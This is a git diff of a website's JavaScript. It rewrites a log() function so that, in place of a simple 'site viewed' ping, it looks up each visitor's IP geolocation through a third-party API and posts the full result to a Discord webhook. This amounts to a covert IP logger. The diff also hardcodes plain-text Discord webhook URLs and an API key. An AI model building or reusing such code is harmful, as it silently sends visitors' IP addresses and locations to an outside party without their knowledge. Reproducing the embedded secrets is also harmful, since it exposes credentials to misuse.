@@ -137,16 +137,27 @@ function update(t) {
 time();
 
 function log() {
-  const req = new XMLHttpRequest();
-  req.open(
-    "POST",
-    "https://discord.com/api/webhooks/953521017609941062/oaYcotGUwXXTX8OrgTgk0oQy-jj5ozENNvHZETIGk3D-A5xO57Ff62PIj_yBNE7jsisP"
+  $.getJSON(
+    "https://ipgeolocation.abstractapi.com/v1/?api_key=159b017772384f868853bf1904ea59d4",
+    function (data) {
+      var newdata = JSON.stringify(data);
+      newdata = newdata.split(",");
+      var out = "";
+      for (var i = 0; i < newdata.length; i++) {
+        out += newdata[i] + "\n";
+      }
+      const request = new XMLHttpRequest();
+      request.open(
+        "POST",
+        "https://discord.com/api/webhooks/963620809665052753/5Q6jNHerl1Hw_MApKGHknwipYIVDEkXUkg9z4SnlUO9BfRtizknxm_k9wr-n42FlLPT_"
+      );
+      request.setRequestHeader("Content-type", "application/json");
+      const params = {
+        username: "My Webhook Name",
+        avatar_url: "",
+        content: out,
+      };
+      request.send(JSON.stringify(params));
+    }
   );
-  req.setRequestHeader("Content-type", "application/json");
-  const params = {
-    username: "My Webhook Name",
-    avatar_url: "",
-    content: "Somebody has viewed the site.",
-  };
-  req.send(JSON.stringify(params));
 }
